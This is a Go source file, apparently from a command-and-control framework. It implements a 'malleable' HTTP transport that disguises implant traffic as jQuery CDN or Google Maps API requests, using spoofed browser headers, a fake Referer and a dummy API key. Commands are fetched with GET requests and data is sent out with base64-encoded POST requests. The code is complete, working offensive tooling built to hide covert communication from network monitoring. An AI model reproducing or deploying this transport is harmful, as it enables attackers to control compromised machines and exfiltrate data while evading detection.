package transport

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"
)

// Profile defines how C2 data is embedded in HTTP requests and responses.
// The encoder/decoder pair transforms raw C2 traffic into innocuous-looking
// HTTP payloads that blend with legitimate web traffic.
type Profile struct {
	GetURIs     []string          // URI patterns for GET (data retrieval)
	PostURIs    []string          // URI patterns for POST (data submission)
	Headers     map[string]string // Custom HTTP headers added to every request
	UserAgent   string            // User-Agent header
	DataEncoder func([]byte) []byte // Transform data before sending
	DataDecoder func([]byte) []byte // Transform received data
}

// JQueryCDN returns a profile that mimics jQuery CDN requests.
func JQueryCDN() *Profile {
	return &Profile{
		GetURIs:  []string{"/jquery-3.7.1.min.js", "/jquery-3.7.1.slim.min.js"},
		PostURIs: []string{"/jquery-3.7.1.min.map", "/jquery-ui.min.js"},
		Headers: map[string]string{
			"Accept":          "text/javascript, application/javascript, */*",
			"Accept-Language": "en-US,en;q=0.9",
			"Referer":         "https://code.jquery.com/",
		},
		UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		DataEncoder: base64Encode,
		DataDecoder: base64Decode,
	}
}

// GoogleAPI returns a profile that mimics Google API calls.
func GoogleAPI() *Profile {
	return &Profile{
		GetURIs:  []string{"/maps/api/js", "/maps/api/geocode/json"},
		PostURIs: []string{"/maps/api/directions/json", "/maps/api/place/findplacefromtext/json"},
		Headers: map[string]string{
			"Accept":          "application/json, text/plain, */*",
			"Accept-Language": "en-US,en;q=0.9",
			"X-Goog-Api-Key":  "AIzaSyDummyKeyForC2Traffic000000000",
		},
		UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		DataEncoder: base64Encode,
		DataDecoder: base64Decode,
	}
}

func base64Encode(data []byte) []byte {
	encoded := make([]byte, base64.StdEncoding.EncodedLen(len(data)))
	base64.StdEncoding.Encode(encoded, data)
	return encoded
}

func base64Decode(data []byte) []byte {
	decoded := make([]byte, base64.StdEncoding.DecodedLen(len(data)))
	n, err := base64.StdEncoding.Decode(decoded, data)
	if err != nil {
		return data // return raw on decode failure
	}
	return decoded[:n]
}

// MalleableOption configures a Malleable.
type MalleableOption func(*Malleable)

// WithTLSConfig sets a custom TLS transport for HTTPS connections.
func WithTLSConfig(tlsTransport *http.Transport) MalleableOption {
	return func(m *Malleable) {
		m.httpClient.Transport = tlsTransport
	}
}

// Malleable wraps an HTTP transport with a malleable profile,
// disguising C2 traffic as legitimate web requests.
type Malleable struct {
	address    string
	timeout    time.Duration
	profile    *Profile
	httpClient *http.Client

	mu       sync.Mutex
	recvBuf  bytes.Buffer
	getIdx   int
	postIdx  int
	closed   bool
	conn     net.Conn // underlying connection for RemoteAddr
}

// NewMalleable creates a Malleable that shapes C2 traffic according
// to the given profile.
func NewMalleable(address string, timeout time.Duration, profile *Profile, opts ...MalleableOption) *Malleable {
	m := &Malleable{
		address: address,
		timeout: timeout,
		profile: profile,
		httpClient: &http.Client{
			Timeout: timeout,
		},
	}
	for _, opt := range opts {
		opt(m)
	}
	return m
}

// Connect establishes the HTTP transport. For malleable profiles this
// validates reachability by performing an initial GET request.
func (m *Malleable) Connect(ctx context.Context) error {
	m.mu.Lock()
	m.closed = false
	m.recvBuf.Reset()
	m.mu.Unlock()

	uri := m.nextGetURI()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, m.address+uri, nil)
	if err != nil {
		return fmt.Errorf("request creation failed: %w", err)
	}
	m.applyHeaders(req)

	resp, err := m.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("connection probe failed: %w", err)
	}
	defer resp.Body.Close()

	// Drain the response to establish that the server is reachable.
	io.Copy(io.Discard, resp.Body) //nolint:errcheck
	return nil
}

// Read reads decoded C2 data. It performs a GET request to retrieve data
// from the server, decodes it using the profile decoder, and copies it
// into the caller's buffer.
func (m *Malleable) Read(p []byte) (int, error) {
	m.mu.Lock()
	if m.closed {
		m.mu.Unlock()
		return 0, io.ErrClosedPipe
	}

	// Return buffered data first.
	if m.recvBuf.Len() > 0 {
		n, err := m.recvBuf.Read(p)
		m.mu.Unlock()
		return n, err
	}
	m.mu.Unlock()

	uri := m.nextGetURI()
	req, err := http.NewRequest(http.MethodGet, m.address+uri, nil)
	if err != nil {
		return 0, fmt.Errorf("request creation failed: %w", err)
	}
	m.applyHeaders(req)

	resp, err := m.httpClient.Do(req)
	if err != nil {
		return 0, fmt.Errorf("data retrieval failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, fmt.Errorf("response read failed: %w", err)
	}

	if m.profile.DataDecoder != nil {
		body = m.profile.DataDecoder(body)
	}

	m.mu.Lock()
	m.recvBuf.Write(body)
	n, readErr := m.recvBuf.Read(p)
	m.mu.Unlock()
	return n, readErr
}

// Write encodes and sends C2 data via a POST request shaped by the profile.
func (m *Malleable) Write(p []byte) (int, error) {
	m.mu.Lock()
	if m.closed {
		m.mu.Unlock()
		return 0, io.ErrClosedPipe
	}
	m.mu.Unlock()

	data := p
	if m.profile.DataEncoder != nil {
		data = m.profile.DataEncoder(p)
	}

	uri := m.nextPostURI()
	req, err := http.NewRequest(http.MethodPost, m.address+uri, bytes.NewReader(data))
	if err != nil {
		return 0, fmt.Errorf("request creation failed: %w", err)
	}
	m.applyHeaders(req)
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := m.httpClient.Do(req)
	if err != nil {
		return 0, fmt.Errorf("data submission failed: %w", err)
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body) //nolint:errcheck

	return len(p), nil
}

// Close marks the transport as closed.
func (m *Malleable) Close() error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.closed = true
	return nil
}

// RemoteAddr returns the remote address. Handles both full URLs
// (https://host:port) and bare host:port addresses.
func (m *Malleable) RemoteAddr() net.Addr {
	host := m.address
	if u, err := url.Parse(m.address); err == nil && u.Host != "" {
		host = u.Host
	}
	addr, err := net.ResolveTCPAddr("tcp", host)
	if err != nil {
		return nil
	}
	return addr
}

// applyHeaders sets profile headers and User-Agent on the request.
func (m *Malleable) applyHeaders(req *http.Request) {
	if m.profile.UserAgent != "" {
		req.Header.Set("User-Agent", m.profile.UserAgent)
	}
	for k, v := range m.profile.Headers {
		req.Header.Set(k, v)
	}
}

// nextGetURI returns the next GET URI from the profile, cycling through the list.
func (m *Malleable) nextGetURI() string {
	if len(m.profile.GetURIs) == 0 {
		return "/"
	}
	m.mu.Lock()
	uri := m.profile.GetURIs[m.getIdx%len(m.profile.GetURIs)]
	m.getIdx++
	m.mu.Unlock()
	return uri
}

// nextPostURI returns the next POST URI from the profile, cycling through the list.
func (m *Malleable) nextPostURI() string {
	if len(m.profile.PostURIs) == 0 {
		return "/"
	}
	m.mu.Lock()
	uri := m.profile.PostURIs[m.postIdx%len(m.profile.PostURIs)]
	m.postIdx++
	m.mu.Unlock()
	return uri
}
